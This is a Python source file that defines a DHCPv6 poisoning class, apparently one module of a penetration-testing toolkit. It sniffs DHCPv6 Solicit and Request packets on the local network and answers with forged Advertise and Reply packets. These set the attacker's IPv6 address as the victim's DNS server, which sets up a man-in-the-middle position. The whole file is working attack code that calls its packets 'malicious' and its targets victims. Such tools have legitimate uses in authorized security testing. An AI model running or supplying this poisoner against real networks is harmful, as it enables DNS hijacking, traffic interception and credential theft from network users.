#!/usr/bin/env python3
from typing import Tuple
from scapy.all import (
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
    DHCP6_Advertise,
    DHCP6_Solicit,
    DHCP6OptDNSServers,
    DHCP6OptDNSDomains,
    DHCP6OptIA_NA,
    DHCP6OptIAAddress,
    DHCP6_Request,
    DHCP6_Reply,
    DHCP6OptServerId,
    DHCP6OptClientId,
)
from loguru import logger
from colorama import Fore, Style
from .poisonnetwork import PoisonNetwork


class DHCP6(PoisonNetwork):
    """[ DHCP6 poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        domain (str): [Target domain]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        domain: str,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
        self.__domain = domain + "."

    def __generate_ipv6_address(self) -> DHCP6OptIAAddress:
        return DHCP6OptIAAddress(
            optlen=24, addr="fe80::8577:1", preflft=300, validlft=300
        )

    def __advertise_packet(self, pkt: packet, response: packet) -> packet:
        response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)

        response /= DHCP6OptClientId(duid=pkt[DHCP6_Solicit].duid)
        response /= DHCP6OptServerId(duid=pkt[DHCP6_Solicit].duid)
        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
        response /= DHCP6OptIA_NA(
            iaid=pkt[DHCP6OptIA_NA].iaid,
            T1=200,
            T2=250,
            ianaopts=self.__generate_ipv6_address(),
        )
        return response

    def __reply_packet(self, pkt: packet, response: packet) -> packet:
        response /= DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
        response /= DHCP6OptServerId(duid=pkt[DHCP6_Request].duid)
        response /= DHCP6OptClientId(duid=pkt[DHCP6_Request].duid)
        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
        response /= DHCP6OptIA_NA(
            iaid=pkt[DHCP6OptIA_NA].iaid,
            T1=200,
            T2=250,
            ianaopts=self.__generate_ipv6_address(),
        )
        return response

    def __transport_layer(self, response: packet) -> packet:
        response /= UDP(sport=547, dport=546)
        return response

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        if pkt.haslayer(DHCP6_Solicit):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6)Capturing SOLICIT packet from {pkt[IPv6].src}{Style.RESET_ALL}",
            )
            response = self.__advertise_packet(pkt, response)
        if pkt.haslayer(DHCP6_Request):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6)Capturing REQUEST packet from {pkt[IPv6].src}{Style.RESET_ALL}",
            )
            response = self.__reply_packet(pkt, response)
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.info_logger.debug("Packet crafted: ")
        self.info_logger.debug(response.summary())
        if ip_of_the_packet not in self.targets_used:
            if response.haslayer(DHCP6_Advertise):
                self.info_logger.log(
                    self.logger_level,
                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 ADVERTISE packet to {ip_of_the_packet}{Style.RESET_ALL}",
                )
            else:
                self.info_logger.log(
                    self.logger_level,
                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 REPLY packet to {ip_of_the_packet}{Style.RESET_ALL}",
                )

            sendp(response, verbose=False)
            self.targets_used.append(ip_of_the_packet)

    def __filter_for_dhcp6(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(IPv6)
            and pkt[IPv6].dst == "ff02::1:2"
            and (pkt.haslayer(DHCP6_Request) or pkt.haslayer(DHCP6_Solicit))
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_dhcp6(pkt):
            response = self._data_link_layer(pkt)
            response, ip_of_the_packet = self._network_layer(pkt, response)
            response = self.__transport_layer(response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_dhcp6_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.info_logger.log(
            self.logger_level, f"Starting dhcp6 poisoning to attack {self.__domain}"
        )
        self._start_cleaner()
        sniff(
            filter="udp and port 547",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )
